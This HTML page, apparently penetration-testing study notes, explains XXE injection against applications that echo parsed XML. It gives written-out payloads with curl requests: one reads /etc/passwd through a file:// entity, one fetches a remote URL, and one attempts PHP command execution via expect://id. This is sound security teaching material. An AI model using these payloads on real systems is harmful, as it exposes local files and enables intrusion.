<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XXE: XML data visible in HTTP response</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>XXE: XML data visible in HTTP response</h1><br /><br />XXE vulnerability is relevant only for the
    applications parsing XML data, the main attack vector when testing an application for XXE vulnerability will be any
    feature within the application which takes input in XML format<br /><br /><strong>When the parsed XML data is
      visible in HTTP response</strong><br />If an application is parsing XML data and displaying the result of parsed
    XML in HTTP response, we can send an XXE payload and check the result<br />Below we have some examples to understand
    it.<br /> <span style="text-decoration:underline;">1) Proof of Concept(POC)</span><br /> 1- Payload
    (book2.xml)<br />
    <div class="codebox">
      <div class="codebox">
        &lt;?xml&nbsp;version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&lt;!ELEMENT&nbsp;foo&nbsp;ANY&nbsp;&gt;<br />&lt;!ENTITY&nbsp;xxe&nbsp;&quot;It&nbsp;works!!!&quot;&nbsp;&gt;]&gt;<br />&lt;entry&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;author&gt;&amp;xxe;&lt;/author&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;The&nbsp;Hitchhiker&#39;s&nbsp;Guide&nbsp;to&nbsp;the&nbsp;Galaxy&lt;/title&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;publish_date&gt;1979&lt;/publish_date&gt;<br />&lt;/entry&gt;<br />
      </div>
    </div><br /> 2- Request<br />
    <div class="codebox">
      <div class="codebox">curl&nbsp;-d@/home/student/Desktop/XXE/book1.xml&nbsp;http://example.org/book.php</div>
    </div><br /> -d [data] → Sends the specified data in a POST request to the HTTP server, in the same way that a
    browser does when a user has filled in an HTML form and presses the submit button. If we start the data with the
    letter <strong>@</strong>, the rest should be a file name to read the data from.<br /> <a href=""><img
        src="images/1565-1.png" alt="images/1565-1.png" /></a><br /> <span style="text-decoration:underline;">2) Display
      Local Files</span><br /> 1- Payload (book3.xml)<br />
    <div class="codebox">
      <div class="codebox">
        &lt;?xml&nbsp;version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&lt;!ELEMENT&nbsp;foo&nbsp;ANY&nbsp;&gt;<br />&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;file:///etc/passwd&quot;&nbsp;&gt;]&gt;<br />&lt;entry&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;author&gt;&amp;xxe;&lt;/author&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;The&nbsp;Hitchhiker&#39;s&nbsp;Guide&nbsp;to&nbsp;the&nbsp;Galaxy&lt;/title&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;publish_date&gt;1979&lt;/publish_date&gt;<br />&lt;/entry&gt;<br />
      </div>
    </div><br /> 2- Request<br />
    <div class="codebox">
      <div class="codebox">curl&nbsp;-d@/home/student/Desktop/XXE/book3.xml&nbsp;http://example.org/book.php</div>
    </div> <br /> <a href=""><img src="images/1565-2.png" alt="images/1565-2.png" /></a><br /><br /> 3) <a
      href="enetration_Test_Methodology--WebApp_Pentest--Exploitation--Server-side--Directory(path)_Traversal_-_File_Inclusion--Remote_File_Inclusion.html">Remote
      File Inclusion (RFI)</a><br /> 1- Payload (book4.xml)<br />
    <div class="codebox">
      <div class="codebox">
        &lt;?xml&nbsp;version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&lt;!ELEMENT&nbsp;foo&nbsp;ANY&nbsp;&gt;<br />&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;http://example.org/robots.txt&quot;&nbsp;&gt;]&gt;<br />&lt;entry&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;author&gt;&amp;xxe;&lt;/author&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;The&nbsp;Hitchhiker&#39;s&nbsp;Guide&nbsp;to&nbsp;the&nbsp;Galaxy&lt;/title&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;publish_date&gt;1979&lt;/publish_date&gt;<br /><span
          style="color:#000000;font-weight:400">&lt;</span>/entry<span style="color:#000000;font-weight:400">&gt;</span>
      </div>
    </div><br /> 2- Request<br />
    <div class="codebox">
      <div class="codebox">curl&nbsp;-d@/home/student/Desktop/XXE/book4.xml&nbsp;http://example.org/book.php</div>
    </div><br /> <a href=""><img src="images/1565-3.png" alt="images/1565-3.png" /></a><br /> 4) Remote code Execution
    via PHP<span style="color:#ff0000;">(WARNING: NOT TESTED)</span><br /> We need to use expect://[command]<br /> 1-
    Payload (book5.xml)<br />
    <div class="codebox">
      <div class="codebox">
        &lt;?xml&nbsp;version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&lt;!ELEMENT&nbsp;foo&nbsp;ANY&nbsp;&gt;<br />&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;expect://id&quot;&nbsp;&gt;]&gt;<br />&lt;entry&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;subject&gt;&amp;xxe;&lt;/subject&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;category&gt;Random&nbsp;text&nbsp;1&lt;/category&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;text&gt;Random&nbsp;text&nbsp;2&lt;/text&gt;<br /><span
          style="color:#000000;font-weight:400">&lt;</span>/entry<span style="color:#000000;font-weight:400">&gt;</span>
      </div>
    </div><br /> 2- Request<br />
    <div class="codebox">
      <div class="codebox">curl&nbsp;-d@/home/student/Desktop/XXE/book5.xml&nbsp;http://example.org/guide/xml.php</div>
    </div><br /> <br /> <br /> <br />Bibliography:<br />• <a
      href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/" target="_blank">https://www.synack.com/blog/a-deep-dive-into-xxe-injection/</a>
  </div>
</body>

</html>